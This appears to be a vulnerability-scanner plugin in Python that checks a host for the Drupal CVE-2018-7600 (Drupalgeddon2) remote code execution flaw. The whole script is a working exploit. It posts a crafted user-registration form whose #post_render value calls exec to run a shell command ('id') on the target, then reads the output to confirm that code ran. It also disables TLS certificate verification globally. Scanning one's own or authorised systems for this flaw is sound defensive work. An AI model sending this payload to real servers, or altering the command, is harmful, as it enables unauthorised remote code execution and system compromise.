# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if drupal cms cve-2018-7600 remote code exec vul')
    try:
        path = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        vulpath = url + path
        headers = {
            "Accept-Encoding":"gzip, deflate",
            "Accept":"*/*",
            "Accept-Language":"en",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
            "Content-Length":"103"
        }
        payload = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
        html = requests.post(vulpath, verify=False, headers=headers, timeout=8, data=payload).text
        if 'uid' in html and 'gid' in html and 'group' in html:
            msg = 'There is a drupal cms cve-2018-7600 remote code exec vul on %s' % url
            print(msg)
            number = 'v119'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no drupal cms cve-2018-7600 remote code exec vul'
    number = 'v0'
    return False, url, number, msg


